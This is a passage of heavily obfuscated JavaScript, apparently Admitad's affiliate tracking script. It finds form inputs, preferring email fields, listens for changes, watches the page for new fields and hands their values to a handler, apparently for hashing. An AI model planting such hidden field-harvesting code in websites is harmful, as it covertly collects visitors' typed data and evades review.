      ADMITAD[_0x59eefd(0xdc)][_0x59eefd(0xfc)](_0x53ee24, ADMITAD[_0x59eefd(0xdc)][_0x59eefd(0x10a)]), (_0x53ee24[_0x59eefd(0xe2)] || _0x53ee24[_0x59eefd(0xea)]) && ADMITAD[_0x59eefd(0xf0)][_0x59eefd(0xe0)](_0x53ee24);
    }
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0xfb)] = function (_0x1a62e) {
    var _0x50d29d = _0x1c871c,
      _0x2684b0 = this;
    if (d[_0x50d29d(0xc5)]) _0x1a62e[_0x50d29d(0xc5)](_0x50d29d(0xc4), function (_0x574855) {
      var _0x5741ad = _0x50d29d;
      _0x2684b0[_0x5741ad(0xe3)](this[_0x5741ad(0x10c)]);
    });else d[_0x50d29d(0x114)] && _0x1a62e[_0x50d29d(0x114)](_0x50d29d(0xcc), function () {
      var _0x580e2a = _0x50d29d;
      function _0x49c15b() {
        var _0x26b2c4 = _0x1235;
        _0x2684b0[_0x26b2c4(0xe3)](this[_0x26b2c4(0x10c)]);
      }
      _0x49c15b[_0x580e2a(0xc1)](_0x1a62e);
    });
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0xe6)] = function (_0x360f3c) {
    var _0x3d2644 = '',
      _0x509074 = this,
      _0x27e167 = function _0x177bc8(_0x3c0832) {
        var _0x23d1b5 = _0x1235,
          _0x48a50b = _0x3c0832[_0x23d1b5(0x10c)];
        _0x48a50b !== _0x3d2644 && (_0x3d2644 = _0x48a50b, _0x509074[_0x23d1b5(0xe3)](_0x3d2644));
      };
    setTimeout(function () {
      _0x27e167(_0x360f3c);
    }, 0x7d0);
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0x109)] = function () {
    var _0x54690e = _0x1c871c,
      _0x311c85 = [][_0x54690e(0x102)][_0x54690e(0xc1)](document[_0x54690e(0xce)](_0x54690e(0x10d))),
      _0x24589a = _0x311c85[_0x54690e(0xf2)](function (_0x526ec7) {
        var _0x5a6125 = _0x54690e;
        return _0x526ec7[_0x5a6125(0xff)] === _0x5a6125(0x10f);
      });
    _0x24589a[_0x54690e(0xd8)] > 0x0 ? _0x311c85 = _0x24589a : _0x311c85 = _0x311c85[_0x54690e(0xf2)](function (_0x1bbe35) {
      var _0x5015f3 = _0x54690e;
      return _0x1bbe35[_0x5015f3(0xff)] !== _0x5015f3(0xef);
    });
    var _0x31c169 = this;
    for (var _0x1cd35b = 0x0; _0x1cd35b < _0x311c85[_0x54690e(0xd8)]; _0x1cd35b++) {
      var _0xe35ffd = _0x311c85[_0x1cd35b];
      _0x31c169[_0x54690e(0xe6)](_0xe35ffd), _0x31c169[_0x54690e(0xfb)](_0xe35ffd), _0xe35ffd[_0x54690e(0x10c)] !== '' && _0x31c169[_0x54690e(0xe3)](_0xe35ffd[_0x54690e(0x10c)]);
    }
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0xd6)] = function () {
    var _0x1220e6 = _0x1c871c,
      _0x11e0ad = {};
    _0x11e0ad[_0x1220e6(0x110)] = ![], _0x11e0ad[_0x1220e6(0x106)] = !![], _0x11e0ad[_0x1220e6(0xe9)] = ![], _0x11e0ad[_0x1220e6(0xd4)] = !![], this[_0x1220e6(0x10e)][_0x1220e6(0xca)](document[_0x1220e6(0xdd)], _0x11e0ad);
  }, ADMITAD[_0x1c871c(0xd1)][_0x1c871c(0x104)][_0x1c871c(0x107)] = function (_0x3c40c1) {
    var _0x5775e6 = _0x1c871c,
      _0x440414 = this;
    Array[_0x5775e6(0x104)][_0x5775e6(0x102)][_0x5775e6(0xc1)](_0x3c40c1)[_0x5775e6(0xfe)](function (_0x324bbe) {
      var _0x205cd4 = _0x5775e6;
      if (_0x324bbe[_0x205cd4(0xd7)] !== _0x324bbe[_0x205cd4(0xcb)]) return;
      var _0x34f2e6 = void 0x0;
      _0x324bbe[_0x205cd4(0xd2)] === _0x205cd4(0x10d) ? _0x34f2e6 = [_0x324bbe] : _0x34f2e6 = Array[_0x205cd4(0x104)][_0x205cd4(0x102)][_0x205cd4(0xc1)](_0x324bbe[_0x205cd4(0xce)](_0x205cd4(0x10d)));
      var _0x64067b = _0x34f2e6[_0x205cd4(0xf2)](function (_0x3625ca) {
        var _0x30f330 = _0x205cd4;
        return _0x3625ca[_0x30f330(0xff)] === _0x30f330(0x10f);
      });
      if (_0x64067b[_0x205cd4(0xd8)] > 0x0) _0x34f2e6 = _0x64067b, _0x440414[_0x205cd4(0xd0)] = !![];else !_0x440414[_0x205cd4(0xd0)] ? _0x34f2e6 = _0x34f2e6[_0x205cd4(0xf2)](function (_0xf69e3e) {
        var _0x4c1b29 = _0x205cd4;
        return _0xf69e3e[_0x4c1b29(0xff)] !== _0x4c1b29(0xef);
      }) : _0x34f2e6 = [];
      for (var _0x1c29d8 = 0x0; _0x1c29d8 < _0x34f2e6[_0x205cd4(0xd8)]; _0x1c29d8++) {
        var _0x27e67e = _0x34f2e6[_0x1c29d8];
        _0x440414[_0x205cd4(0xe6)](_0x27e67e), _0x440414[_0x205cd4(0xfb)](_0x27e67e);
      }
    });
  }, ADMITAD[_0x1c871c(0xf4)] = new ADMITAD[_0x1c871c(0xd1)]();
  function _0x1235(_0x267361, _0x50218b) {
    var _0x449ffc = _0x449f();
    return _0x1235 = function (_0x123549, _0x90ba56) {
      _0x123549 = _0x123549 - 0xbf;
      var _0x22adc6 = _0x449ffc[_0x123549];
      if (_0x1235['BcYmWU'] === undefined) {
        var _0x263acb = function (_0x352833) {
          var _0xa48c35 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
          var _0x447a73 = '',
            _0x228329 = '';
          for (var _0x10d097 = 0x0, _0x1a9bbf, _0x9b2324, _0x3f9a1e = 0x0; _0x9b2324 = _0x352833['charAt'](_0x3f9a1e++); ~_0x9b2324 && (_0x1a9bbf = _0x10d097 % 0x4 ? _0x1a9bbf * 0x40 + _0x9b2324 : _0x9b2324, _0x10d097++ % 0x4) ? _0x447a73 += String['fromCharCode'](0xff & _0x1a9bbf >> (-0x2 * _0x10d097 & 0x6)) : 0x0) {
            _0x9b2324 = _0xa48c35['indexOf'](_0x9b2324);
          }
          for (var _0xb7f128 = 0x0, _0x42ba96 = _0x447a73['length']; _0xb7f128 < _0x42ba96; _0xb7f128++) {
            _0x228329 += '%' + ('00' + _0x447a73['charCodeAt'](_0xb7f128)['toString'](0x10))['slice'](-0x2);
          }
          return decodeURIComponent(_0x228329);
        };
        _0x1235['bkrnUF'] = _0x263acb, _0x267361 = arguments, _0x1235['BcYmWU'] = !![];
      }
      var _0x1f0f44 = _0x449ffc[0x0],
        _0xa11483 = _0x123549 + _0x1f0f44,
        _0x3e9894 = _0x267361[_0xa11483];
      return !_0x3e9894 ? (_0x22adc6 = _0x1235['bkrnUF'](_0x22adc6), _0x267361[_0xa11483] = _0x22adc6) : _0x22adc6 = _0x3e9894, _0x22adc6;
    }, _0x1235(_0x267361, _0x50218b);
  }
  function _0x449f() {
    var _0x582138 = ['z2v0rwXLBwvUDhncEvrHz05HBwu', 'u2HHmJu2', 'B2jZzxj2zxjfBwfPBezVDw5K', 'y3jVC3nezxzPy2vY', 'DgfNtMfTzq', 'CMvMzxjLBMnLC09YzgvY', 'C3vIDhjLzq', 'ywrKzwroB2rLCW', 'B2jZzxj2zurVBq', 'BM9Kzvr5Cgu', 'BgvUz3rO', 'Bg9JyxrPB24', 'zw5JB2rL', 'v2vIs2L0txv0yxrPB25pyNnLCNzLCG', 'sgvSCgvYCW', 'yM9KEq', 'mJj4wu9SwMO', 'zw1szq', 'y3jLyxrLrw1HAwXjBwfNzxm', 'B2jZzxj2zwrjBNb1Dhm', 'DwLK', 'C2vUzenYB3nZrgv2AwnLsgfZAa', 'nMPhrLDIDq', 'ndm4otjeuhnmz00', 'yxv0B0nVBxbSzxrLq2HLy2TLCG', 'y3vZDg9Tzxi', 'AxnwywXPzefKzhjLC3m', 'y2HHCMfJDgvYrgf0yq', 'z2nSAwq', 'Dw5KzwzPBMvK', 'sw52B2LJzq', 'z2v0rw1HAwXgCM9Tu3rVCMfNzq', 'zxHLyW', 'CgfZC3DVCMq', 'tMv0D29YAW', 'mtq0odHxB2jhENi', 'zMLSDgvY', 'otC0nJe2CxvRuKr6', 'rgvKDxbizwXWzxi', 'ovzywKLnvq', 'u1rpuKfhrv9lrvLFrK9sx0fevL9ftufjta', 'AgfZAa', 'C2fSDa', 'mJa4mLPktfn2Bq', 'tw96txv0yxrPB25pyNnLCNzLCG', 'yxr0ywnOt25dAgfUz2vjBNb1Da', 'C2v0rw1HAwXuB1n0B3jHz2u', 'ntm0odvWB1j1u0e', 'zM9YrwfJAa', 'DhLWzq', 'Ag9ZDg5HBwu', 'zuHHC2G', 'C2XPy2u', 'DgvZDa', 'ChjVDg90ExbL', 'q2fTCgfPz25dB2rL', 'y2HPBgrmAxn0', 'zMLUzeLUChv0CW', 'mtmXnKXhBwXLtW', 'C3rHCNrdCM9ZC0rLDMLJzq', 'u1rpuKfhrv9lrvLFrK9sx0zpvu5ex0vnquLm', 'AgfZsw5WDxrczwvUt2jZzxj2zwq', 'DMfSDwu', 'su5qvvq', 'zg9Tt2jZzxj2zxi', 'zw1HAwW', 'yxr0CMLIDxrLCW', 'ndy5odeWCwDrExDp', 'Dg9mB3DLCKnHC2u', 'wefetuLuquq2odq3zNr5', 'yxr0ywnOrxzLBNq', 'vxrMoa', 'mtmWmZm3AhzHruzV', 'zw5KC1DPDgG', 'y2fSBa', 'z2v0r2nSAwq', 'yNjVA2vY', 'y2HHBMDL', 'ywrKrxzLBNrmAxn0zw5LCG', 'z2v0vgfNvgfNqwLK', 'nJuYAMX0vvbd', 'ywnJB3vUDeLK', 'C3vPza', 'B2jZzxj2zq', 'ruXftuvovf9ot0rf', 'B25JAgfUz2u', 'txv0yxrPB25pyNnLCNzLCG'];
    _0x449f = function () {
      return _0x582138;
    };
    return _0x449f();
  }
})(document, window);